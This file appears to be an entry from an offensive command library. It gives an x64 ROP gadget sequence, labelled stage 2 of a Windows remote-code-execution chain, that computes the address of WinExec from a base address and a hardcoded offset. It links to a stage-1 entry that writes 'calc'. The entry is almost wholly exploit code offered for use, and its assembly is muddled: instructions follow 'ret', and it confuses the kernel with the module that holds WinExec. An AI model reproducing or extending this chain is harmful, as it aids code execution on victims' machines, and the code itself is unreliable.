---
data: >-
  pop rcx ; Load kernel base into rcx\nret ;\nmov rax, [rcx] ; Resolve kernel
  function pointer\npop rbx ; Load offset to WinExec\nret ; Offset of WinExec
  from kernel base ->0x68820\nadd rax, rbx ; Calculate WinExec address
tags:
  - rop
  - rce
type: command
output: Computed address of WinExec.
executor: asm
platforms:
  - Windows
id: 2901620e-d23e-4621-affc-3ac79a05b257
created_at: '2025-12-13T23:55:06.746Z'
updated_at: '2025-12-13T23:55:06.746Z'
verified: false
validated: true
submitted: true
---
# rop-stage2-resolve-winexec

## Command

```asm
pop rcx ; Load kernel base into rcx
ret ;
mov rax, [rcx] ; Resolve kernel function pointer
pop rbx ; Load offset to WinExec
ret ; Offset of WinExec from kernel base ->0x68820
add rax, rbx ; Calculate WinExec address
```

## Description

Resolves kernel base and computes WinExec address via ROP.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| rbx | Offset to WinExec (0x68820) | Yes |
| rcx | Kernel base address | Yes |

## Examples

### Basic Usage

Chain after stage 1.

## Expected Output

rax holds WinExec pointer.

## Related

- [[commands/rop-stage1-write-calc]]
